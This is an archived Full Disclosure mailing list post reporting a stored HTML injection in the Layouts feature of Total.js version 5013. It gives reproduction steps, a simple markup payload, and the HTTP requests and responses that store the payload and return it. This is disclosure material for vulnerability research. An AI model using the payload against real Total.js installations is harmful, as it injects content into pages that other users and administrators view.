---
title: Stored HTML Injection - Layout Functionality - totaljsv5013
url: https://seclists.org/fulldisclosure/2025/Oct/26
source: Full Disclosure
date: 2025-10-29
fetch_date: 2025-10-30T03:13:01.075252
---

# Stored HTML Injection - Layout Functionality - totaljsv5013

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](25)
[By Date](date.html#26)
[![Next](/images/right-icon-16x16.png)](27)

[![Previous](/images/left-icon-16x16.png)](25)
[By Thread](index.html#26)
[![Next](/images/right-icon-16x16.png)](27)

![](/shared/images/nst-icons.svg#search)

# Stored HTML Injection - Layout Functionality - totaljsv5013

---

*From*: Andrey Stoykov <mwebsec () gmail com>
*Date*: Sun, 26 Oct 2025 17:49:49 +0000

---

```
# Exploit Title: Stored HTML Injection - Layout Functionality - totaljsv5013
# Date: 10/2025
# Exploit Author: Andrey Stoykov
# Version: 5013
# Tested on: Debian 12
# Blog:
https://msecureltd.blogspot.com/2025/10/friday-fun-pentest-series-45-stored.html

Stored HTML Injection - Layout Functionality:

Steps to Reproduce:
1. Login with user and visit "Layouts"
2. Click on "Create" and enter name for the layout
3. Trap the HTTP POST request and in the "html" parameter value enter the
Stored HTML Injection payload below
4. Upon visiting the newly created layout the payload would execute

<h1>HTMLi</h1>

// HTTP POST Request - Creating New Layout

POST /admin/ HTTP/1.1
Host: 192.168.58.153
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0)
Gecko/20100101 Firefox/145.0
[...]

{"schema":"layouts_save","data":{"name":"xss-test-layout-name-test","html":"<h1>HTMLi</h1>"}}

// HTTP POST Response - Creating New Layout

HTTP/1.1 200 OK
content-type: application/json; charset=utf-8
cache-control: private, no-cache, no-store, max-age=0
vary: Accept-Encoding, Last-Modified, User-Agent
expires: -1
x-powered-by: Total.js
Date: Sun, 26 Oct 2025 16:41:53 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Content-Length: 39

{"success":true,"value":"JE6c9M1cB61f"}

// HTTP GET Request - Triggering the Payload

POST /admin/ HTTP/1.1
Host: 192.168.58.153
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0)
Gecko/20100101 Firefox/145.0
[...]

{"schema":"layouts_html","data":{"id":"JE6c9M1cB61f"}}

// HTTP GET Response - Triggering the Payload

HTTP/1.1 200 OK
content-type: application/json; charset=utf-8
cache-control: private, no-cache, no-store, max-age=0
vary: Accept-Encoding, Last-Modified, User-Agent
expires: -1
x-powered-by: Total.js
Date: Sun, 26 Oct 2025 16:46:18 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Content-Length: 60

{"name":"xss-test-layout-name-test","html":"<h1>HTMLi</h1>"}
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](25)
[By Date](date.html#26)
[![Next](/images/right-icon-16x16.png)](27)

[![Previous](/images/left-icon-16x16.png)](25)
[By Thread](index.html#26)
[![Next](/images/right-icon-16x16.png)](27)

### Current thread:

* **Stored HTML Injection - Layout Functionality - totaljsv5013** *Andrey Stoykov (Oct 28)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")